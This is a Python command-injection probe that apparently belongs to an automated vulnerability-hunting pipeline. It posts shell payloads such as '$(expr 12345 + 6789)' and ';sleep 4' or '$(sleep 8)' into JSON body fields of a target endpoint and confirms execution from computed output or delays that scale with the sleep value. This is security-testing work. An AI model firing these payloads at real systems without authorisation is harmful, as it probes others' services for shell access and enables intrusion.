#!/usr/bin/env python3
"""Generic JSON-body-sink command-injection probe for an UNKNOWN JSON sink.

Rule #85: the one loop hunts targets it has never seen — JSON-body
sinks covered reflected XSS (Rule #80) and SQLi (Rule #84), but APIs
that pass a JSON field to a SHELL (status pages, ping/dig utilities,
report generators, exec-backed admin endpoints) are a third JSON
class the generic set never covered: query-cmdi (Rule #65) attacks
?params only, never the JSON body, so a JSON-field command injection
never trips it. A real human hunter tests the body fields too.

The probe takes the sink spec from its marker argv (the one loop
encodes it there so _probe_cmd needs no changes):

    MARKER = PLOOP85|<target_base>|<path>|POST|<field_csv>

Rule #80 PART 2 pattern: the 5th component is a CSV of common JSON
field names (the engine cannot know the API's real field names). The
probe tries each name in order — control+differential per field — and
the first CONFIRMED wins, so the engine budget stays 2 turns per
sink. Every name is validated up front; one bad name fails the whole
probe closed (a quote or brace in the marker must never reach
json.dumps as a key).

Flow (stdlib only), one field at a time (body carries ONLY that
field):
  1. STABILITY GATE: POST the same benign JSON twice. If the two
     bodies differ, the endpoint is dynamic/noisy and no claim can be
     grounded -> skip that field (never claim on noise; the Rule #55
     false-positive lesson).
  2. OUTPUT CHANNEL (via=cmdi-arith): POST {field:
     "$(expr 12345 + 6789)"}. The probe NEVER transmits the string
     "19134" — only the expression. If the response body contains
     "19134", the target's shell evaluated the expression: command
     execution, not reflection. A verbatim echo of the operands with
     "19134" absent is reflection -> note, then the timing channel.
  3. TIMING CHANNEL (via=cmdi-timing): a blind differential copied
     from probe_sink_cmdi.py (Rule #65), POST-shaped. Three benign
     POSTs give the baseline median t0 (a jittery baseline — spread
     > 1.5s — or a slow baseline > 2.5s fails closed for this field:
     no claim is ever grounded on noise). Then delay payloads in the
     JSON field value (;sleep D / $(sleep D) / `sleep D` / |sleep D),
     2 trials at D=4: a variant "catches" when BOTH trials run >=
     t0 + 4 - 1.5s. Then 2 trials at D=8 with the same variant:
     CONFIRM only when median(RTT8) - median(RTT4) >= 2.0s — the
     delay SCALES with the injected number. Random slowness does not
     scale, so a one-shot delay with no proportional follow-up is
     FAILED (fail-closed).

The benign base is run-unique (benign85-<nonce>): every run is an
independent reconfirm (Rule #81) — no replayed evidence.

Evidence vocabulary (Rule #73): mirrors probe_sink_cmdi.py —
  EVIDENCE sink=<path> json_field=<f> via=cmdi-arith result=19134
  EVIDENCE sink=<path> json_field=<f> via=cmdi-timing baseline=... ...
then  EVIDENCE class=command_injection via=cmdi-arith|cmdi-timing;
the future claim class is "command_injection" (same class as Rule
#65, distinct module generic_jsoncmdi — dedup is (module, class,
location), so an endpoint vulnerable via both a query param and a
JSON field files two distinct claims, the Rule #69 rationale).

Fail-closed rules (the probe lesson, 29 Oct):
  - Marker must be PLOOP85|<tb>|<path>|POST|<csv>; non-POST fails
    closed (JSON sinks are POST-only).
  - The JSON field name is validated ([A-Za-z0-9_.[\\]-]{1,64}) —
    a bad name aborts instead of injecting JSON syntax.
  - The control requests can never confirm (benign value, no
    expression, no delay).
  - Jittery or slow baseline -> timing channel abandoned for that
    field (fail-closed).
  - A delay at D=4 that does not scale at D=8 -> FAILED.
  - A reflected payload without the computed result -> FAILED
    (reflection, not execution).
  - No output result and no scaled delay -> FIELD <f>: not
    injectable -> VERDICT: FAILED.

One self-contained reproducible command, fixed marker from argv, own
VERDICT line. Any exception -> PROBE_ERROR + VERDICT: FAILED. The
probe never fetches anything external; the only thing that "sleeps"
is the target's own shell, which is the signal under test.
"""
import hashlib
import http.client
import json
import os
import re
import sys
import time
import urllib.parse

REQ_TIMEOUT = 25
_BASELINE_TIMEOUT = 10
_FIELD_NAME_RE = re.compile(r"[A-Za-z0-9_.\[\]-]{1,64}\Z")
_ARITH_PAYLOAD = "$(expr 12345 + 6789)"
_ARITH_RESULT = "19134"
_ARITH_OPERAND = "12345"
# Delay ladder: the differential is D=4 vs D=8; both must scale.
_D1, _D2 = 4, 8
# Separator variants tried in order, first catch wins.
_VARIANTS = [";sleep %d", "$(sleep %d)", "`sleep %d`", "|sleep %d"]


def _timed_post(tb, path, body_dict, timeout):
    """POST JSON without following redirects. Returns (code, body,
    rtt). Error-status bodies are signal too (a 500 may carry the
    evaluated result); transport errors still fail closed."""
    pu = urllib.parse.urlparse(tb.rstrip("/") + path)
    host, port = pu.hostname, pu.port
    use_ssl = pu.scheme == "https"
    conn_cls = (http.client.HTTPSConnection if use_ssl
                else http.client.HTTPConnection)
    raw = json.dumps(body_dict).encode("utf-8")
    conn = conn_cls(host, port or (443 if use_ssl else 80),
                    timeout=timeout)
    try:
        t0 = time.monotonic()
        conn.request("POST", pu.path, body=raw,
                     headers={"User-Agent": "PLOOP85",
                              "Content-Type": "application/json",
                              "Content-Length": str(len(raw))})
        resp = conn.getresponse()
        body = resp.read().decode("utf-8", "replace")
        return resp.status, body, time.monotonic() - t0
    finally:
        conn.close()


def _median(xs):
    s = sorted(xs)
    n = len(s)
    return s[n // 2] if n % 2 else (s[n // 2 - 1] + s[n // 2]) / 2.0


def main():
    # argv[1] is the marker: the _probe_cmd wrapper invokes
    #   python3 "$DST" "$MK"   (DST=argv[0], marker=argv[1])
    marker = sys.argv[1] if len(sys.argv) > 1 else "PLOOP85"
    try:
        _, tb_q, path_q, method, field_csv = marker.split("|", 4)
    except ValueError:
        print("PROBE_ERROR bad marker spec: %r" % marker)
        print("VERDICT: FAILED")
        return
    tb = urllib.parse.unquote(tb_q)
    path = urllib.parse.unquote(path_q)
    method = (method or "POST").upper()
    fields = [f.strip() for f in (field_csv or "").split(",")]
    fields = [f for f in fields if f]
    if not tb or not path.startswith("/") or method != "POST":
        print("PROBE_ERROR invalid sink spec "
              "(JSON-cmdi needs a POST JSON-body sink)")
        print("VERDICT: FAILED")
        return
    # Every name is validated UP FRONT — one bad name fails the whole
    # probe closed (a quote or brace in the marker must never reach
    # json.dumps as a key).
    for f in fields:
        if not _FIELD_NAME_RE.match(f):
            print("PROBE_ERROR invalid JSON field name %r (fail-closed: "
                  "no JSON-syntax injection via the marker)" % f)
            print("VERDICT: FAILED")
            return
    if not fields:
        print("PROBE_ERROR no JSON field names in marker (fail-closed)")
        print("VERDICT: FAILED")
        return
    nonce = os.urandom(4).hex()
    base = "benign85-" + nonce  # run-unique benign value (Rule #81)
    print("RUN_NONCE %s" % nonce)
    print("EVIDENCE sink=%s marker=%s" % (path, marker))

    for field in fields:
        # STABILITY GATE: the identical benign JSON POST twice.
        try:
            _, b1, _ = _timed_post(tb, path, {field: base},
                                   _BASELINE_TIMEOUT)
            _, b2, _ = _timed_post(tb, path, {field: base},
                                   _BASELINE_TIMEOUT)
        except Exception as exc:
            print("PROBE_ERROR field %s benign fetch failed: %s"
                  % (field, exc))
            continue
        if b1 != b2:
            print("FIELD %s: skipped (dynamic endpoint, baseline "
                  "unstable — no claim grounded)" % field)
            continue

        # ---- Channel 1: command OUTPUT (arithmetic). ----
        # The canary VALUE "19134" is never transmitted — only the
        # expression. Its presence in the body proves evaluation.
        try:
            _, abody, _ = _timed_post(tb, path,
                                      {field: _ARITH_PAYLOAD},
                                      _BASELINE_TIMEOUT)
        except Exception as exc:
            print("PROBE_ERROR field %s arith fetch failed: %s"
                  % (field, exc))
            continue
        if _ARITH_RESULT in abody:
            print("EVIDENCE sink=%s json_field=%s via=cmdi-arith "
                  "result=%s" % (path, field, _ARITH_RESULT))
            print("EVIDENCE class=command_injection via=cmdi-arith")
            print("VERDICT: CONFIRMED")
            return
        if _ARITH_OPERAND in abody:
            print("PROBE_NOTE field %s: payload echoed verbatim but "
                  "the expression was not evaluated (reflection, not "
                  "execution)" % field)
        else:
            print("PROBE_NOTE field %s: no command-output signal"
                  % field)

        # ---- Channel 2: BLIND TIMING differential (Rule #65,
        # POST-shaped). ----
        base_rtts = []
        try:
            for _ in range(3):
                _, _, rtt = _timed_post(tb, path, {field: base},
                                        _BASELINE_TIMEOUT)
                base_rtts.append(rtt)
        except Exception as exc:
            print("PROBE_ERROR field %s baseline fetch failed: %s"
                  % (field, exc))
            continue
        t0 = _median(base_rtts)
        spread = max(base_rtts) - min(base_rtts)
        if spread > 1.5 or t0 > 2.5:
            # Fail closed: a timing claim needs a fast, stable
            # baseline. Jitter or slowness can never confirm.
            print("PROBE_NOTE field %s: baseline unstable "
                  "(median=%.2fs spread=%.2fs) — timing channel "
                  "abandoned (fail-closed)" % (field, t0, spread))
            print("FIELD %s: not injectable (no command-output "
                  "signal, timing channel fail-closed)" % field)
            continue
        caught_variant = None
        rtts_d1 = []
        for variant in _VARIANTS:
            trials = []
            try:
                for _ in range(2):
                    _, _, rtt = _timed_post(
                        tb, path, {field: variant % _D1}, REQ_TIMEOUT)
                    trials.append(rtt)
            except Exception as exc:
                print("PROBE_ERROR field %s delay fetch failed: %s"
                      % (field, exc))
                break
            if all(t >= t0 + _D1 - 1.5 for t in trials):
                caught_variant, rtts_d1 = variant, trials
                break
            print("PROBE_NOTE field %s: variant %r no delay "
                  "(rtts=%s)" % (field, variant % _D1,
                                 ",".join("%.2f" % t
                                           for t in trials)))
        else:
            print("PROBE_NOTE field %s: no delay variant caught "
                  "(no timing signal)" % field)
            print("FIELD %s: not injectable (no command-output "
                  "signal, no scaled delay)" % field)
            continue
        if caught_variant is None:
            print("FIELD %s: not injectable (delay fetch error, "
                  "fail-closed)" % field)
            continue
        # Differential: the SAME variant at D2 must run
        # proportionally longer. Random slowness does not scale with
        # the number.
        rtts_d2 = []
        try:
            for _ in range(2):
                _, _, rtt = _timed_post(
                    tb, path, {field: caught_variant % _D2},
                    REQ_TIMEOUT)
                rtts_d2.append(rtt)
        except Exception as exc:
            print("PROBE_ERROR field %s delay fetch failed: %s"
                  % (field, exc))
            print("FIELD %s: not injectable (fail-closed)" % field)
            continue
        scale = _median(rtts_d2) - _median(rtts_d1)
        if scale >= 2.0:
            print("EVIDENCE sink=%s json_field=%s via=cmdi-timing "
                  "baseline=%.2f d%d=%.2f d%d=%.2f scale=%.2f" %
                  (path, field, t0, _D1, _median(rtts_d1),
                   _D2, _median(rtts_d2), scale))
            print("EVIDENCE class=command_injection "
                  "via=cmdi-timing")
            print("VERDICT: CONFIRMED")
            return
        print("PROBE_NOTE field %s: delay at D=%d did not scale at "
              "D=%d (scale=%.2fs) — one-shot slowness, not execution "
              "(fail-closed)" % (field, _D1, _D2, scale))
        print("FIELD %s: not injectable (no command-output signal, "
              "no scaled delay)" % field)

    print("VERDICT: FAILED")


if __name__ == "__main__":
    try:
        main()
    except Exception as exc:
        print("PROBE_ERROR: %s" % exc)
        print("VERDICT: FAILED")
